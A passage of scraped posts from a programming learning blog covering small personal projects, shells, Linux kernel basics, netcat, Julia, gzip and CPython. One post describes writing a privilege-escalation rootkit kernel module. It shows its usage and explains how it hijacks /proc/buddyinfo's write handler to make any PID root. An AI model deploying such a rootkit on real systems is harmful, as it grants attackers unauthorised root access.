This “click on a line” design wouldn’t make sense in a normal debugger context\nbecause usually you have loops and a line might be run more than once. But our\nfocus here isn’t on control flow, and none of the example programs have loops. \n\n The other thing I’m happy with is the decision to use regular links like ( <a href=\"#example=hexadecimal\"> ) for all the navigation. There’s an\n onhashchange  Javascript event that takes care of making sure we update the\npage to match the new URL. \n\n I think there were more design struggles but I forget what they were right now. \n\n that’s all! \n\n Here’s the link again: \n\n \n>>  Memory Spy  <<\n \n\n Let me know on Twitter or Mastodon if you notice any problems. \n\n"},
{"url": "https://jvns.ca/blog/2022/03/08/tiny-programs/", "title": "Some tiny personal programs I've written", "content": "\n     \n\n I was talking to a friend last summer about what resources might be helpful for\nfolks learning to program. My friend said they thought some people might\nbenefit from a list of small and fun programming projects – the kind of thing\nyou can do in an evening or weekend. \n\n So let’s talk about that! I like to write small programs that have some\nmarginal utility in my life. Kind of like this: \n\n \n ah! A minor problem in my life! \n I know, I bet I can solve this problem with CODE. YAY. \n 4 hours of happy programming ensues \n \n\n This isn’t always the most  practical  (many of the problems I’ve\nsolved with programming could have been solved in less time in other ways), but\nas long as your goal is actually to have fun programming and your programs\ndon’t hurt anyone else, I think this is a great approach :) \n\n So here are a few examples of small personal programming projects\nI’ve done. I’m not going to talk about “learning projects” where my goal was\nto learn something specific because I’ve already written a billion blog posts\nabout that. \n\n These are more about just doing something fun with no specific learning goal. \n\n a theatre festival didn’t have a calendar \n\n The local Fringe Festival had a bunch of shows, but there was no place I could\nsee a calendar all one one page. So I wrote a Python script to scrape their\nwebsite and generate a calendar. Here’s  the code  and  the output . \n\n printing out covers for tiny books \n\n I saw a  TikTok video  recently where someone made miniature physical versions of the\nebooks they read. I decided to try it out, so I needed to print tiny versions\nof a bunch of book covers. I could have resized all of them manually, but I\ndecided to do it with programming instead. \n\n So I wrote a little bit of HTML and CSS\n( tinybooks.html ), converted it to a PDF, and printed it out. \n\n getting my scanner to work better \n\n This is barely “programming”, but I needed to scan a bunch of documents for a\nfamily member, and I didn’t like the available software. So I wrote a  tiny shell script wrapper for  scanimage  to\nmake the process simpler. This one actually helped me a lot and I still use it when\nscanning. \n\n getting a vaccine appointment \n\n When the second COVID vaccine doses opened up, all of the slots were full. It\nturned out that the website’s backend had an API, so I wrote a script to poll\nthe API every 60 seconds or so and watch for cancellations and notify me so\nthat I could get an earlier appointment. \n\n This didn’t turn out to be necessary (more appointments opened up pretty soon\nanyway and there were enough for everyone), but it was fun. \n\n In general I try to be careful when using APIs like this in a way the\ndevelopers didn’t intend to avoid overloading the site. \n\n looking at housing market data \n\n We were thinking of buying a condo a few years ago and I was mad that I\ncouldn’t get any information about historical prices, so I wrote an iPython\nnotebook that queried the API of a local real estate website to scrape some\ninformation and calculate some statistics like price per square foot over time. \n\n I don’t think this actually helped us at all with buying a condo but it was fun. \n\n (“using the API of local services” seems to be an ongoing theme, one of my\nfavourite things is to use secret undocumented APIs where you need to copy your\ncookies out of the browser to get access to them) \n\n crossword business cards \n\n In 2013, I thought it might be fun to have a business card that was a crossword\nwith some of my interests. So I wrote general software to  generate crosswords from a text file . I’m pretty sure\nnever printed the business cards but it was fun to write. \n\n generating envelopes \n\n I was mailing some zines a while ago, and I decided I wanted to print custom\nlabels on every envelope – sort of a “mail merge” situation. So I wrote a\nPython program to go through all of the mailing address and generate some HTML\nand CSS. Then I turned the HTML/CSS into a PDF and printed the envelopes. This\nworked great. \n\n investigating dice rolling patterns \n\n A friend showed me a dice rolling game where you roll a bunch of dice and add\nup the values. I mentioned that if you roll enough dice and add up all the\nvalues, at some point it gets a lot less “random”. \n\n But then I wanted to see exactly how much less random it gets. So I wrote a\ntiny program to roll 2500 dice and add up the resulting sums a bunch of times\nto see how it works. (presumably you could calculate the same thing with math,\nbut it’s easier with code) \n\n This was so little code I’ll just inline it here. (it’s Python). Here’s [the output]( https://gist.github.com/jvns/e4a35ca2bad90c1a0fcaf578a803b456 \n\n import random\n\ndef roll():\n    return sum(random.randint(1, 6) for i in range(2500))\n\nwhile True:\n    print(roll())\n \n\n getting drawings into the Notability app \n\n I was using an app called Squid to do drawing, and I was switching to\nNotability and wanted to get my old drawings into Notability. So I  reverse engineered the Notability file format . \n\n I don’t think this was ultimately that useful (I ultimately ended up switching\nto a different drawing app which had a real SVG import), but I had fun. \n\n turning off retweets \n\n This is a slightly less tiny project (it took more than one day), but I decided I didn’t want to see retweets\non Twitter anymore so I\nwrote a  small website  so I could turn off retweets. \n\n I really love tiny projects \n\n All of these examples are more recent, but I think that when I was starting to learn to\nprogram tiny low-stakes projects like this really helped me. I love that \n\n \n they’re just for me (if it goes wrong, it doesn’t matter!) \n I can finish them in an evening or weekend (it’s not a Huge Giant Thing hanging over my head) \n if it works, there’s some tangible output in my life (like some envelopes or miniature books or a schedule a business card or a better Twitter experience) \n \n\n"},
{"url": "https://jvns.ca/blog/2013/09/30/hacker-school-day-2-what-does-a-shell-even-do/", "title": "Day 1: What does a shell even do?", "content": "\n      So I’m working on writing a shell in C a little bit. Before yesterday, I\ndidn’t have a very clear idea of what writing a shell even  meant . Here\nare some things that your shell has to do! I’m sure there are some\nImportant Things missing. \n\n \n Parse what you type in to figure out which are the commands and which\nare the arguments ( ls -la LICENSE ) \n expand  ls *  into  ls file1 file2 file3 ... \n Pipes! If you write  ls | grep blah , it needs to send the output from\n ls  into  grep . And redirection too. \n Signal handling! If you press  Ctrl+C , it needs to send that signal\nto whatever process you’re running. Or something. I don’t really\nunderstand this yet. \n Process management! Lets you background and foreground jobs. ( Ctrl+z \nand  fg  and  bg ) \n Shell scripting! (for loops and things) \n \n\n And a thing the shell  doesn’t  have to do: \n\n \n Figure out which command to execute using the  $PATH  environment\nvariable.  exec  does that, apparently. \n \n\n I think I’m going to work on implementing pipes & redirection & signal\nhandling. \n\n"},
{"url": "https://jvns.ca/blog/2013/10/02/day-3-what-does-the-linux-kernel-even-do/", "title": "Day 3: What does the Linux kernel even do?", "content": "\n      We had a really fun session this morning where we got together and made\na list of the different functions that Linux kernel takes care of.\nTomorrow we’re going to go into more details on some specific parts of\nthe kernel. So exciting. \n\n (there are comments now! If some of these things are wrong, comment?) \n\n Here are the systems we came up with, in no particular order: \n\n \n memory management (RAM) \n device drivers (keyboard, network, graphics card, mouse, monitors,\nwireless cards, etc.) \n starting processes \n thread scheduling\n \n filesystems (ext3, ext4, reiserfs, fat32, etc.) \n VFS: interface that lets you get files no matter what filesystem\nyou’re using \n UNIX APIs (system calls: here’s  a list ) \n POSIX security model (permissions) \n virtual machines, containers (like LXC) \n networking (bridging, firewalls, protocol implementations like TCP/IP,\nUDP, ethernet, ICMP, RPC, wireless). \n IPC (interprocess communication) \n signals (SIGINT, SIGKILL) \n interrupt handlers – handles events from the hardware (packet\nreceived, keypress, timers, graphics card ready, data ready, hard\ndrive finished reading). Hardware is sometimes handled in other ways\nlike DMA. \n Timers (when I call  sleep() ) \n Timekeeping (when I ask for the time) \n architecture-specific stuff (amd64, powerpc, x86, MIPS, ARM) \n power management \n loading kernel modules \n kernel debugging tools \n \n"},
{"url": "https://jvns.ca/blog/2016/02/20/measuring-cpu-time-with-clock-gettime/", "title": "How to measure your CPU time: clock_gettime!", "content": "\n      I’m  super into measuring CPU time . If you have a slow program, the first thing you want to know is whether your program is spending that time calculating things on the CPU, or whether it’s waiting for something else (a disk, a network, user input). \n\n At work yesterday, someone sent an email saying “Hey we’re measuring how much CPU time every HTTP request takes now!”. I didn’t know how to accomplish what they said they’d just done. So I asked “hey how does that work?”. Here’s the answer. \n\n It turns out that if you’re a HTTP server, and you want to know exactly how much CPU time your HTTP requests are taking, you can just ask the Linux kernel! \n\n On Linux, there’s a system call (and corresponding libc function) called  clock_gettime . I’d seen this system call before, but I thought it was only for getting the time, like 5:03pm. Not so! Here are the flags you can send to  clock_gettime  on my system. (from  man clock_gettime ). \n\n        CLOCK_REALTIME\n              System-wide  real-time  clock.    Setting   this   clock\n              requires appropriate privileges.\n\n       CLOCK_MONOTONIC\n              Clock  that  cannot be set and represents monotonic time\n              since some unspecified starting point.\n\n       CLOCK_MONOTONIC_RAW (since Linux 2.6.28; Linux-specific)\n              Similar to CLOCK_MONOTONIC, but provides access to a raw\n              hardware-based  time  that is not subject to NTP adjust‐\n              ments.\n\n       CLOCK_PROCESS_CPUTIME_ID\n              High-resolution per-process timer from the CPU.\n\n       CLOCK_THREAD_CPUTIME_ID\n              Thread-specific CPU-time clock.\n \n\n So if you ask your kernel for  CLOCK_PROCESS_CPUTIME_ID , it will tell you how much CPU time has passed since your program started. This is awesome, because you can run \n\n start_time = clock_gettime(CLOCK_PROCESS_CPUTIME_ID)\ndo_maybe_expensive_thing\nend_time = clock_gettime(CLOCK_PROCESS_CPUTIME_ID)\nprint \"elapsed CPU time:\", end_time - start_time\n \n\n And you can  call clock_gettime from Ruby to understand your Ruby performance! . System calls aren’t just for C hackers, they’re for everyone. \n\n In hindsight, it makes sense to me that Linux keeps track of the CPU time spent\nper process.  ps aux  reports how much CPU time every program on your system has\nused (in the  TIME  column), and if you time a program with  time , it reports\nthe total time, userspace CPU time, and kernel CPU time separately. \n\n It’s also interesting that this system call lets you get a monotonic time – that seems useful if you want a notion of time that doesn’t  go back in time . \n\n"},
{"url": "https://jvns.ca/blog/2013/10/06/where-to-find-the-bixi-xml-data-feed/", "title": "Where to find bike sharing systems' data feeds", "content": "\n      Bike sharing systems by  Bixi  publish\ninformation about how many bikes and docks are available at each station\nabout every minute, as XML or JSON. \n\n People sometimes ask me where the feed is for this data, as it’s not\nalways advertised on their website. Here are the feeds for all the\nsystems so far: \n\n XML feeds: \n\n \n Toronto -  http://toronto.bixi.com/data/bikeStations.xml \n Montreal -  http://montreal.bixi.com/data/bikeStations.xml \n Ottawa -  http://capital.bixi.com/data/bikeStations.xml \n Washington D.C. Capital Bike Share -  http://www.capitalbikeshare.com/data/stations/bikeStations.xml \n Minneapolis Nice Ride -  http://secure.niceridemn.org/data2/bikeStations.xml \n Boston Hubway -  http://thehubway.com/data/stations/bikeStations.xml \n London Barclay’s Cycle Hire -  http://www.tfl.gov.uk/tfl/syndication/feeds/cycle-hire/livecyclehireupdates.xml \n \n\n \n\n JSON feeds: \n\n \n New York Citi Bike -  http://citibikenyc.com/stations/json \n Melbourne Bike Share-   http://www.melbournebikeshare.com.au/stationmap/data \n Bay Area Bike Share -  http://bayareabikeshare.com/stations/json \n Chicago Divvy Bikes -  http://divvybikes.com/stations/json \n Chattanooga -  http://www.bikechattanooga.com/stations/json \n Columbus CoGo Bike Share -  http://cogobikeshare.com/stations/json \n Aspen WE-cycle -  https://www.we-cycle.org/pbsc/stations.php \n \n\n Other: \n\n Washington State University’s  Green Bike  system\nhas an unfortunate situation where the availability data is embedded in\nthe source of their homepage (near the end). \n\n I’ve found that there are some irregularities in the feed format, and\nsometimes it changes without notice. It may have stabilized now though. \n\n Happy hacking! \n"},
{"url": "https://jvns.ca/blog/2020/11/11/day-3--an-infinitely-tall-fridge/", "title": "Day 3: an infinitely tall fridge", "content": "\n     \n\n Hello! Here are some notes from Day 3 at the Recurse Center. \n\n This post is an extremely short one from the toy refrigerator poetry\nforum website I’m working on. I needed to come up with a design for it, and\nfinally today I came up with an idea: just put everything on an image of a\nfridge. \n\n I found a stock image of a fridge, but I ran into a problem immediately, which\nwas that the entire website could not fit on said fridge image. \n\n So I figured how to make a fridge that was as tall as I wanted it to be. (not\ntechnically “infinite”, but “a fridge that is as big as required” didn’t have\nquite the same ring). \n\n here’s the infinite fridge \n\n Here’s a CodePen with the HTML/CSS required to make an infinite fridge. It’s relatively simple and I’m\nvery pleased about this. It basically has 3 images: one for the top of the\nfridge, a 1px line that can be repeated as much as required, and then the\nbottom. \n\n \n   See the Pen  \n  infinite refrigerator  by Julia Evans ( Julia Evans )\n  on  CodePen . \n \n \n\n that’s all! \n\n I started writing an explanation of how exactly this infinite fridge works, but I ran out of time so maybe another day :). (the main trick is that  padding-bottom  is a percentage of the parent element’s width, not its height, so you can use it to create a box with a fixed aspect ratio) \n\n"},
{"url": "https://jvns.ca/blog/2013/09/30/hacker-school-day-1-messing-around-with-the-stack-in-c/", "title": "Hacker School Day 1: Messing around with the stack in C", "content": "\n      Today was the first day of  Hacker School .\nThere were tons of amazing people and it was fun and a bit overwhelming. \n\n I paired with  Daphne  on a shell in\nC which is called  _dash \nright now. She is fantastic and taught me tons of things about C. \n\n When trying to tokenize strings in our shell, we ran into a super\nunintuitive bug.  Here’s the  gist  of it:\n \n\n #include <stdio.h>\n\nvoid set_strings(char*** strings) {\n  char* strs[] = {\"banana\"};\n  *strings = strs;\n}\n\nint main() {\n  char** strings;\n  set_strings(&strings);\n  printf(\"First print: '%s'\\n\", strings[0]);\n  char* s = \"abc\";\n  printf(\"Second print: '%s'\\n\", strings[0]);\n}\n \n\n {:lang=‘ruby’} \n\n So this looks like normal code that would print “banana” twice. But\nhere’s what actually happens: \n\n bork@kiwi ~/w/h/gists> gcc write-to-stack.c&& ./a.out\nFirst print: 'banana'\nSecond print: 'UH�WAVAUE1TE1H�H�'\n \n\n {:lang=‘text’} \n\n As I understand it, this is because this line: \n\n \nchar* strs[] = {“banana”};\n \n\n gets allocated on the  stack  and not on the  heap . So the pointer in\n strings  points to the stack and when you do something like setting a\nvariable, it becomes something weird. It took us a while to figure out\nwhat was going on. YAY! \n\n It’s sort of exciting to get bugs that are (as far as I know) totally\nimpossible in Python. \n"},
{"url": "https://jvns.ca/blog/2013/10/04/day-4-processes-vs-threads/", "title": "Day 4: Processes vs threads, and kernel modules!", "content": "\n      There was Linux Kernel Club again yesterday! We spent about half our\ntime having  Daphne  explain the\ndifference between a process and a thread which clarified my brain a\nbit. Here’s what I understood: \n\n Processes each have their own PID and  address space , threads share the\nPID and address space of a single process. \n\n \n\n What is  address space ? \n\n Each process has a piece of memory that it’s allowed to use, so that\nprocesses can’t step on each others’ toes. \n\n This includes \n\n \n the  code  or  text  of the program \n the program’s  data  (strings and constants) \n the  heap  (grows dynamically, where the memory allocated using  malloc  lives) \n the stack (a fixed size, where local variables and functions calls\nlive. Relevant terms:  stack overflow ,  stack trace ) \n the environment variables \n the command line arguments \n \n\n There also appear to be a bunch more things listed on\n this page on kernel.org .\nI’m not sure what most of them mean, but see the list starting with\n``The meaning of each of the field in this sizable struct is as follows: “. \n\n Why threads? \n\n Good things: \n\n \n They can communicate more easily between each other, because they can\njust write to the same memory \n Don’t need to make a copy of the address space for each new thread \n \n\n Bad things: \n\n \n Because they write to the same memory, you can have all kinds of race\nconditions. So you need to use mutexes and things. \n \n\n Kernel modules \n\n We also talked about kernel modules. The consensus was that writing a\nkernel module is a really good way to get started with Linux kernel\ndevelopment, so I think I’m going to try to write one on Monday! \n\n We talked a bit about exploits and rootkits and dastardly things that\nkernel modules can do. \n"},
{"url": "https://jvns.ca/blog/2016/05/13/homu-plus-highfive-making-less-work-for-open-source-maintainers/", "title": "homu + highfive: awesome bots that make open source projects easier", "content": "\n      Someone described my approach to blogging as “fanfiction” recently, a description that I kind of loved. A lot of the time I write about things that I find in the world that love and my take on them. So here is a small thing I saw that I liked! \n\n The other day I submitted a pull request to an open source project ( rust-lang/libc ) for the first time in a while and it was a really delightful experience! There were two bots involved and they were both great. \n\n The first thing that happened is  rust-highfive-bot  commented. It said: \n\n \n Thanks for the pull request, and welcome! The Rust team is excited to review\nyour changes, and you should hear from @alexcrichton (or someone else) soon. \n \n\n I was like YAY! The aforementioned @alexcrichton responded almost immediately, saying \n\n @bors: r+ 1931ee4\n\nThanks!\n \n\n Cool! What is this mysterious  r+ 1931ee4  incantation? What is he saying? Basically he’s saying “this looks reasonable; fine with me as long as the tests pass!” Who is @bors? \n\n bors is the Github account of a  homu ,  homu.io  bot. Homu’s job is to make it so that you don’t have to keep checking to see if the tests pass! This is a huge blessing on this particular repository because the tests take like an hour. Also, the tests seem to be flaky or something, so they failed a few times and bors took care of rerunning them.  here is the pull request, and you can see it getting merged! . \n\n I’m really into homu. It’s the second iteration of a piece of software called  bors by Graydon Hoare , and there’s a great blog post talking about it and highfivebot called  Rust infrastructure can be your infrastructure . \n\n"},
{"url": "https://jvns.ca/blog/2013/10/01/day-2-netcat-fun/", "title": "Day 2: netcat fun!", "content": "\n      Today  Alan  taught me some things about\nnetworking. IN PARTICULAR that you can transfer a file to your friend on\nyour local network with netcat. \n\n Also it is pretty fun to watch the transfer with\n Wireshark . \n\n Here’s how it works: \n\n I run \n\n netcat -l 12345 > file.pdf  or  netcat -l -p 12345 > file.pdf \n\n depending on my version of netcat. (BSD vs not-BSD or something) \n\n You run  netcat $MY_IP_ADDRESS 12345 < file.pdf \n\n Then you wait a while until you think it’s probably done and stop it.\nAnd I have the file! That is all. Since you can see the whole thing in\nWireshark, it is not secure or anything and anyone in the middle could\nalso get the file. FUN. \n\n"},
{"url": "https://jvns.ca/blog/2013/10/09/day-7-an-echo-server-in-clojure/", "title": "Day 7: An echo server in Clojure", "content": "\n      Today I spent some time on a fun kernel module, but it is not working\nyet!  So here is what I also did. \n\n It did not take very long and I didn’t really learn too much Clojure\ndoing this – this is really just procedural code written in Clojure. I\ncan’t tell yet if this is an appropriate way to write a small Clojure\nprogram. Need to get some code review on this. \n\n But it works! You can see the code here:  https://gist.github.com/jvns/6910896 \n \n\n You can interact with the server using  netcat \n(see also:  Day 2: netcat fun! ).\nThe  -u  option here tells netcat to use UDP instead of TCP. \n\n bork@kiwi ~/w/h/clorrent> nc -u localhost 12345\nHi, Clojure!\nHi, Clojure!\n \n\n If you don’t want to set up a whole\n Leinengen  project to run\nthis, you can use\n lein-exec . \n\n This is the first step towards maybe writing a BitTorrent client in\nClojure – many other people are writing BitTorrent client and really\nenjoying it, and I’m jealous. We’ll see if it happens! \n"},
{"url": "https://jvns.ca/blog/2013/10/08/day-6-i-wrote-a-rootkit/", "title": "Day 6: I wrote a rootkit!", "content": "\n      I made some small improvements on my kernel module from yesterday – I\nmade it into a rootkit! \n\n What I mean by a “rootkit” is a kernel module that once I put it in my\nkernel, any unprivileged user who knows the right incantation can become\nroot. \n\n Here’s how to use it: \n\n bork@kiwi > sudo insmod rootkit.ko\nbork@kiwi ~/w/h/kernel-module> echo $$ # PID of my shell\n17792\nbork@kiwi ~/w/h/kernel-module> echo $$ > /proc/buddyinfo\nroot@kiwi #\n \n\n \n\n THEN I AM ROOT. Basically it takes any integer echoed into\n /proc/buddyinfo  and makes that PID owned by root. \n\n The code is here:\n https://gist.github.com/jvns/6894934 .\nIt is pretty short! \n\n How it works \n\n (disclaimer: all this code is actually copied from  this rootkit here \nwhich I pretty much just read and understood a little. But mine does\nless stuff!) \n\n So apparently every file has a  struct file_operations  which controls\nwhat happens when the file is read and written to. For example, if\nyou’re writing a device driver, the important device driver code goes\nthere. Since the kernel can do ANYTHING, it can change those file\nhandlers and do nefarious things. \n\n SO. There’s already a file called  /proc/buddyinfo . I don’t actually\nknow what it does. But it’s read-only. The rootkit \n\n \n Gives a  write  file handler to  /proc/buddyinfo \n In the handler, get the task with the PID that was written \n Change the owner of that task to the same owner as PID 1, which is\nalways  init  and owned by root \n Print “YOU HAVE BEEN HACKED: Making PID $PID root” to the kernel log. \n Bwahaha. \n \n\n Maybe tomorrow I will improve the rootkit so that people can exploit my\ncomputer over the network, not just when they’re logged in. \n"},
{"url": "https://jvns.ca/blog/2013/10/07/day-5-i-wrote-a-kernel-module/", "title": "Day 5: I wrote a kernel module!!!", "content": "\n      I WROTE A KERNEL MODULE. It doesn’t do anything useful or anything, but\nstill! This is a pretty quick post because there was an awesome talk\ntoday by  Mel Chua  and I need to sleep. \n\n The source for the module is at\n https://gist.github.com/jvns/6878994 \n\n It intercepts any incoming packets and prints “Hello packet” to the kernel\nlog for each one. It uses a the Netfilter framework, which I learned\nabout from  this document .\n \n\n To install it, you can run: \n\n $ make\n$ insmod hello-packet.ko\n \n\n and then \n\n $ rmmod hello-packet.ko\n \n\n to remove it. \n\n http://kernelnewbies.org  is a fantastic\nresource and I’ve been learning a lot from it. \n\n Some more resources: \n\n \n Instructions for writing a “hello world” kernel module \n Some examples if you’re interested in learning about rootkits:  1 ,\n 2 ,\n 3 ,\n 4 (pdf) \n \n\n (I think I’m going to work on writing a rootkit tomorrow. eee.) \n\n Some things I learned along the way: \n\n \n You can’t use  malloc  inside the kernel (?!!?). This is because\nanything that’s used in the kernel needs to be defined in the kernel,\nand  malloc  is in glibc. This seems obvious in retrospect, but kind\nof blew my mind \n Similarly, you can’t use anything from glibc in the kernel. \n There are apparently things called  kmalloc  and  vmalloc  that you\ncan use instead. I don’t know what these are yet. \n It is  really  easy to write a firewall that doesn’t let any packets\nin or out – just replace  NF_ACCEPT  with  NF_DROP  in my kernel\nmodule. \n \n"},
{"url": "https://jvns.ca/blog/2013/10/12/day-8-julia-writes-julia-and-open-source/", "title": "Day 8: Julia writes Julia! And remembers that open source is hard.", "content": "\n      At Hacker School this batch there is a wonderful thing called the\n maintainers program .\nThis means that lovely open source project maintainers come help Hacker\nSchoolers contribute to their projects! \n\n Yesterday  Stefan Karpinski  came to talk about\n Julia . Some reasons I’m excited about working on\nJulia: \n\n \n The potential for “Julia works on Julia in Julia” \n Much of the code for Julia is written in Julia, unlike in Python where\nif you want to write fast code you have to write it in C. This seems\npretty huge to me. \n The community seems really nice \n I’m into scientific computing & data science, and that’s what it’s for \n There’s a  DataFrames \nlibrary for Julia, which I’ve already contributed a tiny bit to! \n I love the IPython Notebook to death, and Julia has a backend for it\nso that there’s an IJulia Notebook! <3 <3 <3\n \n \n\n However: \n\n The thing I forgot about open source is that open source (for me!) is\n scary  and  hard .  Discussing bugs on mailing lists and issue trackers\nand submitting pull requests is  terrifying . I have gone to awesome\ncode sprints with really lovely supportive people and gone home and\ncried because being new to a project and trying to get work done is\nsometimes  so frustrating . Like you can spend 12 hours trying to fix a\ntiny bug and get  nowhere . And say ALL OF THE THINGS THAT ARE CONFUSED\nAND WRONG. IN PUBLIC. \n\n HOWEVER! \n\n This is  why I’m at Hacker School . And I’m going to work on lots of\nopen source anyway and write code and make pull requests and then it\nwill not be terrifying. I think Julia is a pretty good place to do this.\nAnd pairing with people makes doing this stuff way easier. \n\n AND I MADE PULL REQUESTS TODAY.\n merged ,\n not merged yet . \n"},
{"url": "https://jvns.ca/blog/2013/10/14/day-9-bytecode-is-made-of-bytes/", "title": "Day 9: Bytecode is made of bytes! CPython isn't scary!", "content": "\n      Today I paired with one of the fantastic Hacker School facilitators,\n Allison   on fixing some bugs in a bytecode\ninterpreter.  byterun  is a pure python interpreter for the bytecode that\nCPython generates, written for learning & fun times. \n\n Allison has a\n great blog post \nabout how to use the  dis  module to look at\nthe bytecode for a function which you should totally read.\n \n\n A few things I learned \n\n The CPython interpreter is mostly in one 3,500 file called  ceval.c  ( see it on github! ). The main part of this file is a 2,000-line switch statement –  switch(opcode) {... . Ack. \n\n But! This file is surprisingly not-scary. Or Allison is just amazing at making\nthings seem not scary. So for example there’s a  BINARY_SUBTRACT  opcode\nwhich, well, subtracts things. \n\n Here’s the actual for serious C code that handles this: \n\n TARGET(BINARY_SUBTRACT) {\n    PyObject *right = POP();\n    PyObject *left = TOP();\n    PyObject *diff = PyNumber_Subtract(left, right);\n    Py_DECREF(right);\n    Py_DECREF(left);\n    SET_TOP(diff);\n    if (diff == NULL)\n        goto error;\n    DISPATCH();\n}\n \n\n {:lang=‘c’} \n\n So, what does this do? \n\n \n Get the arguments off the stack \n Subtract them by looking up  left.__sub__(right) \n Decrease the number of references to  left  and  right  for garbage collection reasons \n Put the result on the stack \n If  __add__  doesn’t return anything, throw an exception \n DISPATCH() , which basically just means “go to the next instruction” \n \n\n I could TOTALLY WRITE THAT. \n\n We spent some time reading the C code that deals with exception handling in\nPython. It was pretty confusing, but I learned that you can do  raise\nValueError from Exception  to set the cause of an exception. \n\n Basically the lesson here is \n\n \n Allison is the best. Pairing with her on  byterun  is the most fun thing \n It’s actually possible to read the C code that runs Python! \n Bytecode is made of bytes. Like, there are less than 256 instructions and each one is a byte. I did not realize this until today. Laugh all you want =D \n \n"},
{"url": "https://jvns.ca/blog/2013/10/16/day-11-how-does-gzip-work/", "title": "Day 11: How does gzip work?", "content": "\n      Spoiler: I don’t really know yet, but there is a lot of mucking with bits. \n\n Yesterday I was flailing around a bit looking for projects. Today at\nlunch Kat helped me figure one out: writing a parallel version of\n gzip  in\n Julia . Julia is a pretty good choice for this\nbecause it lets you do low-level bit-fiddling and write efficient\nalgorithms, but still has lots of nice high-level features. It also looks\na lot like Python! \n\n The document I’m using to understand how gzip works is\n this really detailed and wonderful page .\nSo if you actually want to know you should just read that.\n \n\n The basic idea behind gzip is \n\n \n use some not-so-complicated algorithms (Huffman coding, LZ77\ncompression). These things  sound  like they would be the complicated\npart, but so far they don’t seem to be too bad. Conceptually. I think. \n Do all kinds of bit fiddly things to actually make it efficient. \n \n\n Some choice things from the article (emphasis mine) \n\n \n “hclen is the declaration of  four less than  how many 3-bit length\ncodes follow” (why four?!??) \n Everything is variable-length encoded, so instead of just having\nbytes, you have bit sequences of various lengths that you have to\nextract. Because efficiency. Huffman coding is what makes this\nvariable-length encoding madness actually work. \n Every gzip file begins with the “magic bytes”  1F8B \n \n\n Here is a snippet of Julia code that I wrote to work on this! This code takes\nan array of 8 bits and converts it into a byte. By default Julia does some\nsmart things like bounds checking, but you can make this even faster by\npreventing bounds checking with  @inbounds . \n\n You can see that this kind of just looks like Python, except it is fast! (I\npromise) \n\n function make_int(bv::BitVector)\n    num = 0x00\n    for i=1:length(bv)\n        num = (num << 1) + bv[i]\n    end\n    return num\nend\n \n\n That’s it! Maybe tomorrow I will actually understand how gzip uses Huffman\ncoding. So far I have  started  to decode the gzip header. \n"},
{"url": "https://jvns.ca/blog/2013/10/21/day-13-off-by-one-errors/", "title": "Day 13: Off by one errors", "content": "\n      Today I spent most of the day figuring out that \n\n n_to_read = head.hlit + head.hdist + 257\n \n\n should be \n\n n_to_read = head.hlit + head.hdist + 258\n \n\n And I still don’t know why, exactly. In related news, I can now  almost \ndecompress gzipped files. \n\n I think the life lesson here is “sometimes it takes forever to figure\nthings out and it is no fun” :) \n\n"},
{"url": "https://jvns.ca/blog/2013/10/17/day-12-julia-reflects-on-julia/", "title": "Day 12: Why Julia likes Julia", "content": "\n      Firstly, I will never get tired of the fact that Julia is called Julia.\nIt is the best. It however makes it  really  hard to search for email\nwith “Julia” in them in my inbox. \n\n But! We have Serious Coding Business to discuss. \n\n According to  http://julialang.org , Julia is a\n“high-level, high-performance dynamic programming language for\ntechnical computing”. If you want actual explanations  of what Julia is\nand how it works, there is pretty good documentation there.\n \n\n I’ve been programming in Julia for about a week now. So now is a good\ntime to share my Extreme Julia Expertise. Hopefully someone will correct\nme if I’ve said anything terribly wrong here. \n\n Things I like about Julia \n\n 1) It’s like Python \n\n The syntax is like Python’s syntax. It’s dynamic. It’s fun to write. \n\n 2) It lets me use the IPython notebook (via  IJulia ) \n\n This is  huge  for me. Over the last year, the IPython notebook has\nbecome one of my main programming environments. I find the ability to\nquickly change and run code without having to switch contexts really\nuseful. \n\n 3) The community seems lovely. \n\n So I’m partly biased here because Stefan, one of the creators of Julia,\nhas been at Hacker School all week and he is a lovely guy. But I’ve been\nspending some one in the Julia issue queue as well and all those people\nare lovely as well. \n\n 4) It’s like C \n\n This is kind of the opposite of “it’s like Python”. In Julia when you\nmake a type declaration \n\n type Range\n    start::Int64\n    end::Int64\nend\n \n\n {:lang=‘julia’} \n\n it really only takes up 2 Int64s worth of space! It also means that I\ncan write code that is C-like – I’ve been working from a gzip tutorial\nwhich has lots of C code examples, and they’re pretty straightforward\nto port into Julia. \n\n 5) You can look at the LLVM code for your functions! \n\n So far this is more ‘cool’ than ‘useful’ for me, but it is so cool! \n\n So you can see this is just 2 LLVM instructions! \n\n julia> function blah(x)\n           x+2\n       end\nblah (generic function with 1 method)\njulia> code_llvm(blah, (Int64,))\n\ndefine i64 @julia_blah(i64) {\ntop:\n  %1 = add i64 %0, 2, !dbg !3829\n  ret i64 %1, !dbg !3829\n}\n \n\n 6) A lot of Julia is written in Julia \n\n So if you want to add to the standard library or improve Julia’s type\ninference, you can do it in Julia! I think this is a pretty huge selling\npoint, because having to switch to a different language to make your fast is\nno fun. \n\n Multiple dispatch is also pretty neat. I may write more about it later,\nbecause I’m not able to articulate yet why it gives me nice programming\npatterns. \n\n Things I don’t like about Julia \n\n The REPL starts pretty slowly – it takes about 2 seconds. I think that\nright now all my frustrations with Julia are actually around the REPL\n– there are a few things that possible to do in programs but impossible\nin the REPL. \n\n I also often redefine functions many many times while iterating on some\ncode, and sometimes that makes Julia get confused and I need to restart my\nsession. \n\n That is a pretty small thing, though! \n"},
{"url": "https://jvns.ca/blog/2013/10/22/day-14-apparently-i-should-write-tests/", "title": "Day 14: When it's hard to write tests, that's when I should be testing", "content": "\n      So yesterday I was fighting with an off-by-one error most of the day.\nAnd while it was happening, it was pretty upsetting. There was all this\ncode! And I had no idea where the problem was! \n\n And I kept talking to people about it (Alan! Stefan! Sumana!), and\nkept having conversations like \n\n Them:  “Do you have unit tests?”. \n\n Me:  “Some! But it’s complicated! I don’t really know what my output is supposed to be in the middle of the calculation, just the final result!”. \n\n Them:  “Oh yeah that makes sense it sounds tough”. \n\n BUT! It turns out that when you’re not sure exactly what your code is\nsupposed to be doing or how to verify whether it’s correct is  exactly\nwhen  it’s the most helpful to write unit tests. \n\n \n\n And Stefan suggested an awesome way to fix it a little bit: I took the\nC implementation of gunzip I was using as an example, put some print\nstatements in the middle, and then I had some reference data to check one of\nthe intermediate objects in my program against! It is\n here . \n\n The gunzip is part way to working now – I can decompress small files,\nbut there is still some kind of bug when I try to decompress a bigger\nfile. BUT I WILL FIX IT. And I’m thinking, if I write more tests, maybe\nI’ll have a better 